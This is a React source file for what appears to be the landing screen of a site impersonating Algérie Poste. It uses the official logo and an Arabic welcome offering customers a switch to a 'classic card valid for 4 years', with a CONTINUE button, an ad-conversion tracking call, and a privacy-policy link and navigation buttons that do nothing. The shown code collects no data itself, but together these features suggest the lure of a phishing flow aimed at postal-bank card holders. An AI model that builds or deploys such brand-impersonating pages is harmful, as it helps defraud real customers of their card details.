
import React, { useEffect } from 'react';
import { motion } from 'framer-motion';
import { Lock, MapPin, Newspaper, Phone, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/components/ui/use-toast';
import { sendCapiEvent } from '@/lib/capi';

const WelcomeScreen = ({ onContinue }) => {
  const { toast } = useToast();

  useEffect(() => {
    sendCapiEvent('ViewContent', {}, { step: 'landing' });
  }, []);

  const handlePrivacyPolicy = e => {
    e.preventDefault();
    toast({
      title: "🚧 هذه الميزة لم تنفذ بعد - لكن لا تقلق! يمكنك طلبها في رسالتك القادمة! 🚀",
      duration: 3000
    });
  };
  const handleNavClick = item => {
    toast({
      title: `🚧 ميزة ${item} لم تنفذ بعد - لكن لا تقلق! يمكنك طلبها في رسالتك القادمة! 🚀`,
      duration: 3000
    });
  };
  return <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-8 pb-24 text-center">
        <motion.div initial={{
        opacity: 0,
        y: -20
      }} animate={{
        opacity: 1,
        y: 0
      }} transition={{
        duration: 0.6
      }} className="mb-12">
          <img src="/AlgeriePoste.svg.png" alt="شعار بريد الجزائر" className="w-48 h-auto" />
        </motion.div>

        <motion.div initial={{
        opacity: 0
      }} animate={{
        opacity: 1
      }} transition={{
        duration: 0.6,
        delay: 0.2
      }} className="mb-8">
          <h1 className="text-2xl font-bold text-gray-800 mb-4 text-right">عميلنا العزيز، مرحباً بك في "بريد الجزائر ".</h1>
          <p className="text-lg text-gray-700 leading-relaxed text-right">
            مرحبا بك في خدمة بريد الجزائر لتغيير الى البطاقة الكلاسيكية الصالحة لمدة 4 سنوات
          </p>
        </motion.div>

        <motion.div initial={{
        opacity: 0,
        y: 20
      }} animate={{
        opacity: 1,
        y: 0
      }} transition={{
        duration: 0.6,
        delay: 0.4
      }} className="w-full max-w-md mb-6">
          <Button onClick={onContinue} className="w-full bg-[#1e3a8a] hover:bg-[#1e40af] text-white font-semibold py-6 text-lg rounded-lg transition-all duration-300 hover:shadow-lg flex flex-row-reverse items-center justify-center gap-2">
            <span>CONTINUE</span>
            <span className="transform rotate-180">→</span>
          </Button>
        </motion.div>

        <motion.p initial={{
        opacity: 0
      }} animate={{
        opacity: 1
      }} transition={{
        duration: 0.6,
        delay: 0.6
      }} className="text-sm text-gray-600 max-w-md">
          بدخولك إلى التطبيق فأنت تؤكد موافقتك على{' '}
          <a href="#" onClick={handlePrivacyPolicy} className="text-blue-600 underline hover:text-blue-700 transition-colors">
            سياسة الخصوصية
          </a>
          .
        </motion.p>
      </div>

      <motion.nav initial={{
      opacity: 0,
      y: 50
    }} animate={{
      opacity: 1,
      y: 0
    }} transition={{
      duration: 0.6,
      delay: 0.8
    }} className="fixed bottom-0 left-0 right-0 bg-[#1e3a8a] text-white shadow-lg">
        <div className="flex items-center justify-around py-3">
          <button onClick={() => handleNavClick('معلومات')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Info className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">معلومات</span>
          </button>
          <button onClick={() => handleNavClick('الاتصال')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Phone className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الاتصال</span>
          </button>
          <button onClick={() => handleNavClick('الأخبار')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Newspaper className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الأخبار</span>
          </button>
          <button onClick={() => handleNavClick('الموقع')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <MapPin className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الموقع</span>
          </button>
          <button onClick={() => handleNavClick('تسجيل الدخول')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Lock className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">تسجيل الدخول</span>
          </button>
        </div>
      </motion.nav>
    </div>;
};
export default WelcomeScreen;
